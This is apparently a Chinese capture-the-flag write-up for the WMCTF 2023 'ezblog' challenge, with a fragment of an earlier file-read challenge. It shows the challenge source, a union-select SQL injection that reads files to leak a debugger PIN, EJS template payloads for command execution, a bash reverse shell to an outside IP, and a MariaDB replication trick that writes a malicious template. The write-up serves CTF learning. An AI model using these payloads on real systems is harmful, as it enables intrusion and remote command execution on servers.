
![微信截图_20230819220758.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1692454086094-38f97559-4627-432b-84fd-be6ba54642d6.png#averageHue=%23fdfdfd&clientId=ua00cb3f0-9de3-4&from=paste&height=150&id=uba5abc77&originHeight=188&originWidth=1130&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=11486&status=done&style=none&taskId=uab6c4d2f-c63a-4e67-9eca-7f147ba7477&title=&width=904)
发现了读取路径，发个包
![微信截图_20230819220850.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1692454137059-fcd7c0e1-7efe-4064-bae6-9ca306402149.png#averageHue=%23fafafa&clientId=ua00cb3f0-9de3-4&from=paste&height=55&id=u7aff0e41&originHeight=69&originWidth=458&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2296&status=done&style=none&taskId=u65cbdbad-e93c-4af0-93c9-ebbd3f551a6&title=&width=366.4)
需要路径里面有java且不能有flag。
尝试file伪协议任意路径读取，尾部加入#写入java，不过这种特殊字符要编码![微信截图_20230819221032.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1692454239521-3a53e6cc-faaa-4822-a210-742a8a53227f.png#averageHue=%23f4f3f3&clientId=ua00cb3f0-9de3-4&from=paste&height=502&id=u322ec356&originHeight=628&originWidth=978&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=40651&status=done&style=none&taskId=uf16cc83f-4134-4c3c-83d2-57024510964&title=&width=782.4)
不过flag被ban了，想办法绕一下，url编码一下![微信截图_20230819221257.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1692454385299-ab627805-a60e-459f-be01-56013fd1ed0d.png#averageHue=%23fbfafa&clientId=ua00cb3f0-9de3-4&from=paste&height=477&id=ud708c19f&originHeight=596&originWidth=864&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=19561&status=done&style=none&taskId=ue201c4f2-644b-40f0-acac-05a206d0c93&title=&width=691.2)
不过，再来一次
![微信截图_20230819221414.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1692454462779-72d570a8-7bc3-44de-b4e9-edca234dc0b8.png#averageHue=%23fafafa&clientId=ua00cb3f0-9de3-4&from=paste&height=493&id=uc8cd2ee1&originHeight=616&originWidth=851&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=21358&status=done&style=none&taskId=u54307ba4-2259-4839-869d-6d0a2b88fa5&title=&width=680.8)

# ezblog
环境
```java
docker run -it -d -p 12345:3000 -e FLAG=flag{8382843b-d3e8-72fc-6625-ba5269953b23} lxxxin/wmctf2023_ezblog
```
或者(无非预期)
```java
docker run -it -d -p 12345:3000 -e FLAG=flag{8382843b-d3e8-72fc-6625-ba5269953b23} lxxxin/wmctf2023_ezblog2
```
源码鉴赏一波
```typescript
"use strict";
// XXX 的 软件设计与体系结构 课程作业
// 简介：一个简单的博客系统，使用 Express + EJS + MySQL 实现，创新的使用了基于Token的Session鉴权机制，以及仿照 Werkzeug 实现的调试器鉴权
var __importDefault = (this && this.__importDefault) || function (mod) {
  return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.start = void 0;
const express_1 = __importDefault(require("express"));
const uuid_1 = require("uuid");
const db_1 = require("./db");
const child_process_1 = __importDefault(require("child_process"));
const posts_1 = require("./posts");
let app = (0, express_1.default)();
app.set('view engine', 'ejs');
app.use(express_1.default.json({}));
app.use(express_1.default.urlencoded({ extended: false }));
// 基于Token的Session鉴权机制的编写
let token = (0, uuid_1.v4)();
function requireAuth(req, res, next) {
  if (req.headers && req.headers.authorization && req.headers.authorization === token) {
    next();
  }
  else {
    res.status(401).send({
      code: 401,
      message: "Unauthorized",
      data: "Error: Unauthorized"
    });
  }
}
// debugger
// 仿照 werkzeug 实现的调试器鉴权
// pin 是在启动时生成的，可以在控制台看到，但是不会在页面上显示，需要自己输入，这样可以防止别人直接看到密码，但是又可以让自己知道密码，方便调试
let pin = (0, uuid_1.v4)();
app.post("/api/debugger/auth", (req, res) => {
  let username = req.body.username;
  let password = req.body.password;
  if (username === "debugger" && password === pin) {
    res.json({
      code: 200,
      message: "OK",
      data: token
    });
  }
  else {
    res.json({
      code: 401,
      message: "Error: incorrect pin",
      data: null
    });
  }
});
let python_count = 3;
// "execute" python where python is a kind of snake
app.post("/api/debugger/python/execute", requireAuth, async (req, res) => {
  if (python_count > 0) {
    python_count--;
    res.json({
      code: 200,
      message: "",
      data: "Killed"
    });
  }
  else {
    res.json({
      code: 200,
      message: "",
      data: "Error: you have killed all the snakes"
    });
  }
});
// 调试SQL语句
app.post("/api/debugger/sql/execute", requireAuth, async (req, res) => {
  let sql = req.body.code;
  // 防止恶意sql
  const waf = ['into', 'outfile', 'dumpfile'];
  let filtered = '';
  if (waf.some((w) => { filtered = w; return sql.toLowerCase().includes(w); })) {
    res.json({
      code: 500,
      message: "Hack!!",
      data: `Error: '${filtered}' is not allowed`
    });
    return;
  }
  if (/execute|immediate/igm.test(sql)) {
    res.json({
      code: 500,
      message: "Hack!!",
      data: `Error: 非预期 is fixed`
    });
    return;
  }
  db_1.connection.query(sql, (err, results, fields) => {
    if (err) {
      res.json({
        code: 500,
        message: "Internal Server Error",
        data: err?.message
        });
        return;
        }
        res.json({
        code: 200,
        message: "OK",
        data: results
        });
        });
        });
        // 调试模板
        app.post("/api/debugger/template/test", requireAuth, async (req, res) => {
        try {
        let file = req.body.file;
        // 防止路径穿越造成非预期
        if (/[^a-zA-Z0-9_]/gm.test(file)) {
        res.send(`Error: '${file}' is invalid name`);
        return;
        }
        let posts = await (0, posts_1.getPosts)();
        let post = posts.length > 0 ? posts[0] : null;
        res.render(file, {
        post, posts
        });
        }
        catch (e) {
        res.send(JSON.stringify(e));
        }
        });
        // 调试器前端
        app.get("/console", (req, res) => {
        res.render("console");
        });
        // end debugger
        // 首页
        app.get("/", async (req, res) => {
        try {
        res.render("index", {
        posts: await (0, posts_1.getPosts)()
        });
        }
        catch (e) {
        res.status(500).send(e);
        }
        });
        // 新建或编辑帖子
        app.get("/post/new", (req, res) => {
        res.render("edit", {
        post: null
        });
        });
        app.get("/post/:id/edit", async (req, res) => {
        try {
        // parseInt的性能问题 https://dev.to/darkmavis1980/you-should-stop-using-parseint-nbf
        let id = req.params.id;
        if (!/\d+/igm.test(id) || /into|outfile|dumpfile/igm.test(id)) { // 判断 id是否是纯数字
        res.status(400).send(`Error: '${id}' is invalid id`);
        return;
        }
        // id只能为数字，可以安全的转为number，避免parseInt降低性能
        let post = await (0, posts_1.getPostById)(id);
        res.render("edit", {
        post
        });
        }
        catch (e) {
        res.status(500).send(e);
        }
        });
        // 帖子详情
        app.get("/post/:id", async (req, res) => {
        try {
        let id = parseInt(req.params.id);
        let post = await (0, posts_1.getPostById)(id);
        res.render("post", {
        post
        });
        }
        catch (e) {
        res.status(500).send(e);
        }
        });
        // 编辑或新建帖子
        app.post("/api/post/neworedit", async (req, res) => {
        try {
        let id = req.body.id;
        let title = req.body.title;
        let content = req.body.content;
        let postId = -1;
        if (!Number.isNaN(id = parseInt(id))) {
        // 编辑
        await (0, posts_1.editPost)(id, title, content);
        }
        else {
        // 新建
        postId = await (0, posts_1.addPost)(title, content);
        }
        res.redirect("/post/" + (postId === -1 ? id : postId));
        }
        catch (e) {
        res.status(500).send(e);
        }
        });
        // 图床功能
        const express_fileupload_1 = __importDefault(require("express-fileupload"));
        app.use(express_1.default.static("public"));
        app.use((0, express_fileupload_1.default)({
        limits: { fileSize: 50 * 1024 * 1024 },
        }));
        app.post("/api/picture/upload", async (req, res) => {
        let file = req.files?.file;
        if (!file) {
        res.json({
        code: 500,
        message: "Internal Server Error",
        data: "No file"
        });
        return;
        }
        let uploadPath = "./public/images/" + (0, uuid_1.v4)() + "." + "png";
        file.mv(uploadPath);
        res.json({
        code: 200,
        message: "OK",
        data: uploadPath.replace("./public/images", "")
        });
        });
        function start() {
        // 修复图床功能上传图片失败的问题
        try {
        child_process_1.default.execSync("mkdir -p ./public/images");
        child_process_1.default.execSync("chmod -R 777 .");
        }
        catch (e) { }
        (0, db_1.init)();
        app.listen(3000, () => {
        console.log(" * Serving Express app 'ezblog'");
        console.log(" * Debug mode: on");
        console.log(" * Running on http://0.0.0.0:3000/ (Press CTRL+C to quit)");
        console.log();
        console.log(" * Debugger is active!");
        console.log(" * Debugger PIN: " + pin);
        });
        }
        exports.start = start;

```
源码中
```typescript
app.get("/post/:id/edit", async (req, res) => {
    try {
        // parseInt的性能问题 https://dev.to/darkmavis1980/you-should-stop-using-parseint-nbf
        let id = req.params.id;
        if (!/\d+/igm.test(id) || /into|outfile|dumpfile/igm.test(id)) { // 判断 id是否是纯数字
            res.status(400).send(`Error: '${id}' is invalid id`);
            return;
        }
        // id只能为数字，可以安全的转为number，避免parseInt降低性能
        let post = await (0, posts_1.getPostById)(id);
        res.render("edit", {
            post
        });
    }
    catch (e) {
        res.status(500).send(e);
    }
});
```
存在注入漏洞，虽然只能传入数字，但是强制转型的关系，只要id包含数字即可绕过
```typescript
function getPostById(id) {
    return new Promise((resolve, reject) => {
        // 使用 number 类型的 id 不会导致 sql 注入，因为数字类型只有0-9的数字，无法构造sql语句
        // TypeScript可以确保传入类型只能为number，不能为字符串，如果为字符串，将会发生编译时错误导致tsc无法编译，所以是安全的
        db_1.connection.query(`select * from Posts where id = ` + id, (err, results) => {
            if (err) {
                reject(err);
            }
            else {
                if (results.length === 0) {
                    reject(new Error("Post not found"));
                }
                else {
                    resolve({
                        id: results[0].id,
                        title: results[0].title,
                        content: results[0].content
                    });
                }
            }
        });
    });
}
```
存在注入，不过有waf，不能写马。
## 解法一

```typescript
app.get("/console", (req, res) => {
    res.render("console");
});
```
有个类似于flask的console控制台，需要找到pin码。![微信截图_20230822185717.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1692701843915-1bd43e39-b548-405e-a5bc-4de8b07a062f.png#averageHue=%23b29165&clientId=ub3994fd0-cc3c-4&from=paste&height=104&id=ud932a107&originHeight=130&originWidth=961&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=13575&status=done&style=none&taskId=uf3674198-2529-44db-b609-b3f676b88e7&title=&width=768.8)
启动的时候，日志会记录内容。
```typescript
/post/-1%20union%20select%201,2,load_file(0x2f686f6d652f657a626c6f672f2e706d322f6c6f67732f6d61696e2d6f75742e6c6f67)/edit
```
```typescript
77a2aada-3254-478b-9cf4-8222fde080ce
```
![微信截图_20230822191317.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1692702806054-aa613732-c4d1-4eae-a39d-8719dfc6e4ca.png#averageHue=%23fafaf9&clientId=ub3994fd0-cc3c-4&from=paste&height=615&id=u83a67e6a&originHeight=769&originWidth=1914&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=58775&status=done&style=none&taskId=uf508c179-3cec-4e53-928e-6f6c4cec089&title=&width=1531.2)
有个sql任意执行
```typescript
SELECT "<%= global.process.mainModule.require('child_process').execSync('/readflag').tostring(); %>"
```
```typescript
select "<%= global.process.mainModule.require('child_process').exec("bash -c 'bash -i >& /dev/tcp/43.143.192.19/1145 0>&1'").toString(); %>"
```
## 解法二
主从复制法，
在自己的vps上搭个mysql。
师傅给的是用docker的方法搭建，我从头到尾搞一遍。
```java
sudo yum install -y yum-utils device-mapper-persistent-data lvm2
sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo

sudo yum install docker-ce

sudo systemctl start docker
sudo systemctl enable docker//开机自启

sudo docker --version//验证是否开启

```
起mysql
```java
docker run -it -d --name some-mariadb --env MARIADB_USER=ctf --env MARIADB_PASSWORD=ctf --env MARIADB_ROOT_PASSWORD=123456 -p 53306:3306 mariadb:10.9.8
```
docker命令
```java
docker images

docker ps
docker ps -a//包括停止

```
进去
```java
docker exec -it c5fbacd5e7bd  /bin/sh
```


配置  
```java
sed -i 's@//.*archive.ubuntu.com@//mirrors.ustc.edu.cn@g' /etc/apt/sources.list
apt update
apt install -y nano
```
换源后下载编辑器，方便改binlog。
修改/etc/mysql/mariadb.conf.d/50-server.cnf，
```java
server_id = 100
secure_file_priv = 
log-bin = mysql-bin
binlog_format = MIXED
```
server_id = 100: 这是MySQL服务器的唯一标识符，用于主从复制中的标识。在复制设置中，每个服务器必须具有唯一的server_id。
secure_file_priv = : 这是一个安全设置，用于限制可以从哪个目录读取或写入文件。如果设置了路径，则只有在该路径下的文件才能被数据库访问。
log-bin = mysql-bin: 这启用了二进制日志功能，允许MySQL记录所有写入数据库的操作，以便在主从复制中使用。
binlog_format = MIXED: 这是二进制日志的格式。MIXED格式允许MySQL在某些情况下使用基于语句的日志，而在其他情况下使用基于行的日志，以便在主从复制中更灵活地处理。
![微信截图_20230822220359.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1692713051810-87516d59-eb8a-44d2-a40b-ed49e18fad11.png#averageHue=%23294e64&clientId=u06d4900a-5f88-4&from=paste&height=386&id=u07939edb&originHeight=483&originWidth=795&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=411315&status=done&style=none&taskId=u72af5a8a-7c5b-4f51-a232-3e5a10587d3&title=&width=636)
```java
docker restart some-mariadb
```
```java
mysql -uroot -p123456
set global binlog_checksum=0;//关闭检验，否则会采用crc32检验
reset master; 
create database test;
create table test.employees(
  id INT,
  name VARCHAR(100),
  age INT
);
use test;
INSERT INTO employees(id, name, age) VALUES(1,"1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111",1);
```
reset master用于重置二进制日志文件和位置。
使用后，所有二进制日志文件被关闭，当前使用的日志文件会被重命名，并且索引会设置成1.
且所有已命名的'mysql-bin.xxx'格式的文件都会被删除.
执行完所有操作后，进入/var/lib/mysql可以看到对应文件
![](https://cdn.nlark.com/yuque/0/2023/png/28160573/1692608083756-a517ac50-db94-489f-972f-c428a23edbea.png#averageHue=%23121111&from=url&id=SS8MM&originHeight=220&originWidth=1894&originalType=binary&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&title=)
下载夏莱。
```java
docker cp mysql-bin.000001 some-mariadb:/var/lib/mysql/mysql-bin.000001
```
由于MySQL 的二进制日志（binlog）主要用于记录对数据库的修改操作，例如 INSERT、UPDATE 和 DELETE，以及更改表结构的操作，例如 ALTER TABLE。它不会记录只涉及查询数据而不修改数据的操作，例如 SELECT、SHOW、DESCRIBE 等。
二进制日志在数据库复制和恢复过程中起着重要作用，它允许主服务器记录更改，并将这些更改发送到从服务器以保持同步。这使得从服务器可以按照与主服务器相同的顺序重演这些更改，以确保数据一致性。
所以我们自己改。
![微信截图_20230822224345.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1692715553970-96655629-59cd-4563-b400-8009ce7a3a07.png#averageHue=%233c3932&clientId=u06d4900a-5f88-4&from=paste&height=442&id=u81d61d98&originHeight=553&originWidth=616&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=46687&status=done&style=none&taskId=u22eddcbe-fcb4-47df-b353-72bef7243b1&title=&width=492.8)
![微信截图_20230822224545.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1692715558460-fd3daea7-09a2-47b9-b9fe-c4961486efc1.png#averageHue=%2340382e&clientId=u06d4900a-5f88-4&from=paste&height=457&id=u327315ff&originHeight=571&originWidth=653&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=56656&status=done&style=none&taskId=ue541519d-761d-40f1-a373-c34e9b1c1d9&title=&width=522.4)
```java
SELECT "<%= global.process.mainModule.require('child_process').execSync('/readflag').toString();%>" into outfile "/home/ezblog/views/114.ejs";
```
改完以后再放回去
```java
docker cp mysql-bin.000001 some-mariadb:/var/lib/mysql/mysql-bin.000001
```

在题目靶机的SQL console执行以下命令：

1. 创建mysql数据库
2. 创建主从复制所需用到的表
3. 设置题目靶机的主服务器地址及账号密码
4. 启动主从复制

```java
CREATE DATABASE mysql;
CREATE TABLE mysql.gtid_slave_pos (
  `domain_id` int(10) unsigned NOT NULL,
  `sub_id` bigint(20) unsigned NOT NULL,
  `server_id` int(10) unsigned NOT NULL,
  `seq_no` bigint(20) unsigned NOT NULL,
  PRIMARY KEY (`domain_id`,`sub_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='Replication slave GTID position';
CHANGE MASTER TO
  MASTER_HOST='43.143.192.19',
  MASTER_PORT=53306,
  MASTER_USER='root',
  MASTER_PASSWORD='123456',
  MASTER_LOG_FILE='mysql-bin.000001',
  MASTER_LOG_POS=0;
START SLAVE;
```
```java
SHOW SLAVE STATUS\G

```
看状态
![微信截图_20230822230805.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1692716908025-8d0a25e7-c98f-4348-a725-988ec61e2b2c.png#averageHue=%23f7f6f5&clientId=u06d4900a-5f88-4&from=paste&height=566&id=u2d6d2a67&originHeight=708&originWidth=770&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=31678&status=done&style=none&taskId=u843d2e30-ca42-4f30-bba2-c29429af890&title=&width=616)
rnm搞出来了,学了很多。。

